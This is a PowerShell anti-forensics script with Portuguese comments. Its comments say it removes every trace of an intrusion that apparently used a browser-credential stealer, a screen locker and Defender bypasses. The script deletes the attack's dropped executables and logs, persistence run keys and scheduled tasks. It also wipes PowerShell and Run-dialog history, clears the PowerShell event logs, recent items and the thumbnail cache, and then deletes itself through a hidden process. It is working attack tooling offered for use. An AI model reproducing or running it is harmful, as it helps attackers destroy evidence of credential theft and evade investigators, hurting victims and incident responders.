# anti_forensics.ps1
# Remove TODOS os vestígios da operação E RESTAURA AS DEFESAS
# Execute como Administrador (já estará elevado)

# ==================================================
# CONFIGURAÇÕES
# ==================================================
$TempFolder = $env:TEMP
$ProgramDataFolder = "C:\ProgramData\DumpBrowserSecrets"
$LogFile = "$TempFolder\anti_forensics_log.txt"

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Message"
    Write-Host $line -ForegroundColor Green
    Add-Content -Path $LogFile -Value $line
}

Write-Log "=== INÍCIO DA LIMPEZA FORENSE ==="

# ==================================================
# 0. RESTAURA DEFENDER, UAC E REMOVE EXCLUSÃO C:\
# ==================================================
Write-Log "[0] Restaurando defesas do Windows..."

# 0.1 Remove exclusão do disco C:\
Write-Log "  Removendo exclusão do C:\..."
Remove-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue

# 0.2 Reativa todas as proteções do Defender
Write-Log "  Reativando proteções do Defender..."
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $false -ErrorAction SilentlyContinue
Set-MpPreference -SubmitSamplesConsent 1 -ErrorAction SilentlyContinue
Set-MpPreference -MAPSReporting 2 -ErrorAction SilentlyContinue

# 0.3 Reativa o Firewall
Write-Log "  Reativando Firewall..."
netsh advfirewall set allprofiles state on

# 0.4 Reativa o UAC
Write-Log "  Reativando UAC..."
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 1 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 5 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 1 -Force -ErrorAction SilentlyContinue

# 0.5 Remove políticas do Defender (se criadas)
$defenderPolicies = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
if (Test-Path $defenderPolicies) {
    $props = @("DisableAntiSpyware", "DisableRealtimeMonitoring", "DisableBehaviorMonitoring", "DisableBlockAtFirstSeen", "DisableIOAVProtection", "DisableScriptScanning")
    foreach ($prop in $props) {
        if (Get-ItemProperty -Path $defenderPolicies -Name $prop -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $defenderPolicies -Name $prop -Force -ErrorAction SilentlyContinue
            Write-Log "  Política removida: $defenderPolicies\$prop"
        }
    }
}

Write-Log "  Defesas restauradas com sucesso!"

# ==================================================
# 1. REMOVE ARQUIVOS TEMPORÁRIOS E EXECUTÁVEIS
# ==================================================
Write-Log "[1] Removendo arquivos temporários..."

$filesToDelete = @(
    "$TempFolder\*.tmp",
    "$TempFolder\*.log",
    "$TempFolder\*.json",
    "$TempFolder\*.ps1",
    "$TempFolder\handshake_restore.txt",
    "$TempFolder\webhook_log.txt",
    "$TempFolder\stealer_log.txt",
    "$TempFolder\browser_stealer_log.txt",
    "$TempFolder\sysinfo.exe",
    "$TempFolder\dumpbrowserdata.exe",
    "$TempFolder\screen_locker.exe",
    "$TempFolder\uac.exe",
    "$TempFolder\kill_locker.ps1",
    "$TempFolder\collector_log.txt",
    "$TempFolder\browser_data.json",
    "$TempFolder\DumpOutput"
)

foreach ($file in $filesToDelete) {
    if (Test-Path $file) {
        if ((Get-Item $file).PSIsContainer) {
            Remove-Item -Path $file -Recurse -Force -ErrorAction SilentlyContinue
            Write-Log "  Removida pasta: $file"
        } else {
            Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
            Write-Log "  Removido: $file"
        }
    }
}

# Remove a pasta do DumpBrowserSecrets
if (Test-Path $ProgramDataFolder) {
    Remove-Item -Path $ProgramDataFolder -Recurse -Force -ErrorAction SilentlyContinue
    Write-Log "  Removida: $ProgramDataFolder"
}

# ==================================================
# 2. LIMPA HISTÓRICO DO POWERSHELL
# ==================================================
Write-Log "[2] Limpando histórico do PowerShell..."

$historyPath = (Get-PSReadlineOption).HistorySavePath
if (Test-Path $historyPath) {
    Remove-Item -Path $historyPath -Force -ErrorAction SilentlyContinue
    Write-Log "  Histórico PSReadLine removido: $historyPath"
}

$oldHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $oldHistory) {
    Remove-Item -Path $oldHistory -Force -ErrorAction SilentlyContinue
    Write-Log "  Histórico antigo removido: $oldHistory"
}

Clear-History -ErrorAction SilentlyContinue
Write-Log "  Histórico da sessão limpo"

# ==================================================
# 3. LIMPA HISTÓRICO DO PROMPT DE COMANDO (CMD)
# ==================================================
Write-Log "[3] Limpando histórico do CMD..."

$cmdRecent = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if (Test-Path $cmdRecent) {
    Remove-Item -Path $cmdRecent -Recurse -Force -ErrorAction SilentlyContinue
    Write-Log "  Lista de comandos recentes (Win+R) removida"
}

# ==================================================
# 4. REMOVE TAREFAS AGENDADAS
# ==================================================
Write-Log "[4] Removendo tarefas agendadas..."

$taskNames = @(
    "RestoreDefenses",
    "DisableDefenses",
    "KillLocker"
)

foreach ($task in $taskNames) {
    if (Get-ScheduledTask -TaskName $task -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
        Write-Log "  Tarefa removida: $task"
    }
}

# ==================================================
# 5. LIMPA REGISTRO (ENTRADAS CRIADAS PELO ATAQUE)
# ==================================================
Write-Log "[5] Limpando entradas de registro..."

$registryKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
)

foreach ($key in $registryKeys) {
    $values = @("uac", "sysinfo", "dumpbrowserdata", "screen_locker", "DefenderBypass")
    foreach ($value in $values) {
        if (Get-ItemProperty -Path $key -Name $value -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $key -Name $value -Force -ErrorAction SilentlyContinue
            Write-Log "  Chave removida: $key\$value"
        }
    }
}

# ==================================================
# 6. LIMPA EVENTOS DO WINDOWS (SELETIVO)
# ==================================================
Write-Log "[6] Limpando logs do PowerShell..."

wevtutil cl "Windows PowerShell" -ErrorAction SilentlyContinue
wevtutil cl "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue
Write-Log "  Logs do PowerShell limpos"

# ==================================================
# 7. LIMPA CACHE E ARQUIVOS RECENTES
# ==================================================
Write-Log "[7] Limpando arquivos recentes e cache..."

$recent = "$env:APPDATA\Microsoft\Windows\Recent\*"
if (Test-Path $recent) {
    Remove-Item -Path $recent -Force -ErrorAction SilentlyContinue -Recurse
    Write-Log "  Recent Items limpo"
}

$thumbCache = "$env:USERPROFILE\AppData\Local\Microsoft\Windows\Explorer\thumbcache_*.db"
if (Test-Path $thumbCache) {
    Remove-Item -Path $thumbCache -Force -ErrorAction SilentlyContinue
    Write-Log "  ThumbCache limpo"
}

# ==================================================
# 8. LIMPA O CLIPBOARD
# ==================================================
Write-Log "[8] Limpando clipboard..."
Set-Clipboard -Value "" -ErrorAction SilentlyContinue
Write-Log "  Clipboard limpo"

# ==================================================
# 9. REMOVE O PRÓPRIO SCRIPT (AUTO-DESTRUIÇÃO)
# ==================================================
Write-Log "[9] Auto-destruição ativada..."

if (Test-Path $LogFile) {
    Remove-Item -Path $LogFile -Force -ErrorAction SilentlyContinue
}

$selfDelete = @"
Start-Sleep -Seconds 2
Remove-Item -Path "`$MyInvocation.MyCommand.Path" -Force -ErrorAction SilentlyContinue
"@
$tempScript = "$env:TEMP\self_delete.ps1"
$selfDelete | Out-File -FilePath $tempScript -Force
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden

Write-Log "=== LIMPEZA CONCLUÍDA ==="
